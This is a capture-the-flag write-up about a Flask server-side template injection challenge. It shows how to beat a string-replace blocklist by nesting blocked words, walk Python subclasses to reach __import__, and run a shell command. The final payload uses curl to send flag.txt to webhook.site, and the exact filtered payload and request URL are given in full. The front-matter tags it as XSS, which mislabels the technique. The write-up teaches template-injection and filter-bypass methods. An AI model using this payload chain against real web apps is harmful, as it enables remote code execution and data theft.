---
ai_date: 2025-04-27 05:10:37
ai_summary: Bypassed server-side filtering using template string manipulation and __import__ to execute system command
ai_tags:
  - xss
  - template-string
  - exploitation
created: 2021-12-21T23:50
updated: 2025-07-14T09:46
---

## Super Secure Trustable Implementation

> I've added a bunch of filters, so my app must be really secure now.
>
> Flag in `flag.txt`
>
> URL: http://35.240.143.82:4209/

The source, `main.py` is included hence we should take a look.

```python
import secrets
from flask import Flask, render_template_string, request

app = Flask(__name__)


@app.route("/")
def index():
    name = request.args.get("name", default="World")
    # Evil hacker cannot get past now!
    blocklist = ["{{", "}}", "__", "subprocess", "flag", "popen", "system", "os", "import", "read", "flag.txt"]
    for bad in blocklist:
        name = name.replace(bad, "")
    return render_template_string(f"<h1> Hello, {name}")
```

Since the server uses `render_template_string` its vulunerable to `{{}}` template string attacks.

If we use `{{ 'Hello'+' '+'World' }}` for name, it would give us `Hello World` as the string inside is ran as code.

### Blocklist Bypass

However as we can see, there is an blocklist, and it includes `{{` and `}}`.

To bypass this filter we can simply insert blocklisted words inside of blocklisted words. For example

`{flag{}flag}` will not trigger when checking for `{{` and `}}`, but will have `flag` removed when checking for flag, and would result in `{{}}` as the end output.

Making use of this, we can construct our payloads with the help of a little script.

> I had troubles with reading the file so I decidede to just send the file content via curl
>
> webhook.site is a easy to use site for sending data back

```python
bypass = ["{{", "}}", "__", "subprocess", "flag", "popen", "system", "os", "import", "read"]
bypass.reverse()
payload = ''
for toby in bypass:
    payload = payload.replace(toby, toby[0] + "read" + toby[1:])
print(payload)
name = payload
blocklist = ["{{", "}}", "__", "subprocess", "flag", "popen", "system", "os", "import", "read", "flag.txt"]
for bad in blocklist:
    name = name.replace(bad, "")
print(f"<h1> Hello, {name}")
```

### Bypassing certain unknown filters

If one simply use `__import__`, one will soon realise that it does not exist, this could have been done by deleting built-ins from the python run time.

We can restore the built-ins via `reload(__builtins__)`, however it is obviously, also deleted.

We need to find `__import__` somehow.

With some experimenting, we can find that

```python
>>> ().__class__.__bases__
(<type 'object'>,)
```

The tuple inherits directly from `object`, hence we can find the list of types (extends object) by sending the payload

##### `{{().__class__.__bases__[0].__subclasses__()}}`

```
Hello, [<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>... <class 'flask.blueprints.BlueprintSetupState'>]
```

Much of the output is useless, `_frozen_importlib_external.FileLoader` looks a bit suspicious though. (it is at position 118)

##### `{{().__class__.__bases__[0].__subclasses__()[118]}}`

```
Hello, <class '_frozen_importlib_external.FileLoader'>
```

Just verifying that the class is the `FileLoader`, now lets see what builtins this FileLoader has

##### `{{().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__["__builtins__"]}}`

```
Hello, {'__name__': 'builtins' ... '__import__': <built-in function __import__>,  ...help, or help(object) for help about object.}
```

**Hooray!** We found `__import__`, now we just have to combine the payload into

```python
{{(().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s").system("curl -X POST --data-binary @flflag.txtag.txt https://webhook.site")}}
```

`flag.txt` is manually bypassed since it contains `flag`

### Transforming the payload

```
{read{(()._read_class_read_._read_bases_read_[0]._read_subclasses_read_()[118]._read_init_read_._read_globals_read_["_read_builtins_read_"])["_read_im"+"port_read_"]("o"+"s").sreadystem("curl -X POST --data-binary @flfreadlag.txtag.txt https://webhook.site")}read}

<h1> Hello, {{(().__class__.__bases__[0].__subclasses__()[118].__init__.__globals__["__builtins__"])["__im"+"port__"]("o"+"s").system("curl -X POST --data-binary @flag.txt https://webhook.site")}}
```

The first line is our payload, and after running the same blocklist operations as the server, the resulting string looks ok.

### Sending the payload

`http://35.240.143.82:4209/?name={read{(()._read_class_read_._read_bases_read_[0]._read_subclasses_read_()[118]._read_init_read_._read_globals_read_["_read_builtins_read_"])["_read_im"+"port_read_"]("o"+"s").sreadystem("curl -X POST --data-binary @flfreadlag.txtag.txt https://webhook.site")}read}`

And after checking webhook.site

```flag
flag{server_side_rendering_is_fun_but_dangerous_sometimes}
```

Flag obtained